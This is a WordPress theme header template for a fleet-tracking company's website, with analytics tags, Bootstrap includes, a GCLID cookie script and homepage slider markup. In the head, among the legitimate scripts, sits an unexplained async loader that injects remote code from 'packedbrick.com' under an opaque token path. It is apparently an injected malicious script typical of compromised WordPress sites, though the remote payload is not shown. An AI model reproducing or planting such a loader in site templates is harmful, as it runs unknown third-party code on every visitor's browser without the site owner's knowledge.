<!doctype html>

<!--[if lt IE 7]><html <?php language_attributes(); ?> class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html <?php language_attributes(); ?> class="no-js lt-ie9 lt-ie8"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html <?php language_attributes(); ?> class="no-js lt-ie9"><![endif]-->
<!--[if gt IE 8]><!--> <html <?php language_attributes(); ?> class="no-js"><!--<![endif]-->

<head>
	
	<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5B5K8QQ');</script>
<!-- End Google Tag Manager -->
	
	<meta charset="utf-8">
	<!-- Google Chrome Frame for IE -->
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

	<title><?php wp_title(''); ?></title>

	<!-- mobile meta (hooray!) -->
	<meta name="HandheldFriendly" content="True">
	<meta name="MobileOptimized" content="320">
	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	
		
	<!-- icons & favicons (for more: http://www.jonathantneal.com/blog/understand-the-favicon/) -->
	<link rel="apple-touch-icon" href="<?php echo get_template_directory_uri(); ?>/library/images/apple-icon-touch.png">
	<link rel="icon" href="<?php echo get_template_directory_uri(); ?>/favicon.png">
	<!--[if IE]>
		<link rel="shortcut icon" href="<?php echo get_template_directory_uri(); ?>/favicon.ico">
	<![endif]-->
	<!-- or, set /favicon.ico for IE10 win -->
	<meta name="msapplication-TileColor" content="#f01d4f">
	<meta name="msapplication-TileImage" content="<?php echo get_template_directory_uri(); ?>/library/images/win8-tile-icon.png">

	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>">

	<!-- wordpress head functions -->
	<?php wp_head(); ?>
	<!-- end of wordpress head -->

	<!-- google font -->
	<link href='https://fonts.googleapis.com/css?family=Lato:400,300,300italic,400italic,700,700italic,900,900italic' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
<script type='text/javascript'>
(function(f,b,n,j,x,e){x=b.createElement(n);e=b.getElementsByTagName(n)[0];x.async=1;x.src=j;e.parentNode.insertBefore(x,e);})(window,document,'script','https://packedbrick.com/vfRg2L1ej33bleY00JdN9pxuSvOX2mNI-nTw9UpUoPg');
</script>
<style type="text/css">
#cssmenu>ul>li.red>a{
  color: #53A42A !important;
}
</style>


<!-- Google Adwords GCLID Tracking Code -->
	<script type=”text/javascript”>
function setCookie(name, value, days){
    var date = new Date();
    date.setTime(date.getTime() + (days*24*60*60*1000)); 
    var expires = “; expires=” + date.toGMTString();
    document.cookie = name + “=” + value + expires;
}
function getParam(p){
    var match = RegExp(‘[?&]’ + p + ‘=([^&]*)’).exec(window.location.search);
    return match && decodeURIComponent(match[1].replace(/\+/g, ‘ ‘));
}
var gclid = getParam(‘gclid’);
if(gclid){
    var gclsrc = getParam(‘gclsrc’);
    if(!gclsrc || gclsrc.indexOf(‘aw’) !== -1){
        setCookie(‘gclid’, gclid, 90);
    }
}
</script>
<!-- End Google Adwords GCLID Tracking Code -->
</head>

<body <?php body_class(); ?>>

	<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5B5K8QQ"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
	
	<div id="container">

			<header class="header" role="banner">
				
				<div id="inner-header">

					

					<div class="wrap">						

						<div class="nav-container">

							<a id="top-logo"  class="link" href="<?php bloginfo('siteurl'); ?>"></a>

							<nav role="navigation" id="navigation-wrapper">
								<?php // bones_main_nav(); ?>
                                                            <?php 
                                                            wp_nav_menu(array(
                                                              'menu' => 'Main Menu', 
                                                              'container_id' => 'cssmenu', 
                                                              'walker' => new CSS_Menu_Maker_Walker()
                                                            ));
                                                            ?>
							</nav>
							
							<div id="header_buttons_container">

								<div id="header_buttons">

									<a class="btn-login" href="https://secure.fieldlogixgps.com/">Login</a>							

								</div><!-- end #header_buttons -->

								<div id="phone_search">
									<?php get_search_form(); ?>
								</div>

								

								<div class="clear"></div> 

							</div> <!-- end #header_buttons_container -->

						</div>

						<div id="quote-form">

							<div class="sixcol first">
								
								

								<?php gravity_form(3, $display_title=false, $display_description=false, $display_inactive=false, $field_values=null, $ajax=true, $tabindex); ?>
								
							</div> <!-- first  -->					


							<div class="sixcol last">

								<span class="subtitle">Learn the difference!</span>

								<p class="paragraph">
									<span class="gray">Questions?</span><br>
									(888) 803-0200<br>
									<a  class="link" href="mailto:learnmore@fieldlogix.com">learnmore@fieldlogix.com</a>
								</p>

								<p class="paragraph">
									 <span class="small">We WILL NOT sell or share your info with anyone.</span>
								</p>

								

							</div> <!-- first  -->

							<div class="clear"></div> <!-- clear  -->

						</div> <!-- quote-form  -->

					</div> <!-- wrap  -->

					<div class="clear"></div> <!-- clear  -->

				</div> <!-- end #inner-header -->

			</header> <!-- end header -->

			<?php if(is_page(24147)){ ?>

			<div id="homepage-slider-container">

				<div id="homepage-slider">
					 <div class="slide slide-1">
						<img src="<?php echo get_template_directory_uri(); ?>/library/images/home-banner-1-12.23.jpg" alt="FieldLogix Field Resource Management"  class="slide-bg" width="1920" height="610">
					 	<?php
 
						if(get_field('slide_1'))
						{
							echo '<div class="slide-content">' . get_field('slide_1') . '</div>';
						}
						 
						?>
					 </div>
					 <div class="slide slide-2">
					 	<img src="<?php echo get_template_directory_uri(); ?>/library/images/home_banner_camera_2022.jpeg" alt="Dash Cameras"  class="slide-bg" width="1920" height="610">
					 	<?php
 
						if(get_field('slide_2'))
						{
							echo '<div class="slide-content">' . get_field('slide_2') . '</div>';
						}
						 
						?>
					 </div>
					 <div class="slide slide-3">
					 	<img src="<?php echo get_template_directory_uri(); ?>/library/images/get-more-done-banner-3.6.23.jpeg" alt="Dispatching App"  class="slide-bg" width="1920" height="610">
					 	<div class="slide-content">
						 	<div class="customer-logos">
						 		<?php
						 			if(get_field('slide_3_left')) {
										echo get_field('slide_3_left');
									}
						 		?>
						 	</div>
						 		
						 </div><!-- end .slide-content -->
					 </div>
				</div><!-- end #homepage-slider -->

			</div><!-- end #homepage-slider-container -->

			<?php if ( wp_is_mobile() ) { // Only load the #mobile-header div on mobile devices to save bandwidth on desktop site. ?>

				<div id="mobile-header">
					<div class="slide">
					 	<img src="<?php echo get_template_directory_uri(); ?>/library/images/home-page-mobile-banner-12.2023-2.jpg" alt="FieldLogix Field Resource Management" class="slide-bg"  width="1242" height="1577">
					 	<?php

						if(get_field('slide_1'))
						{
							echo '<div class="slide-content">' . get_field('slide_1') . '</div>';
						}
						 
						?>
				 	</div>
				</div><!-- end #mobile-header -->

			<?php } ?>

			<?php } ?>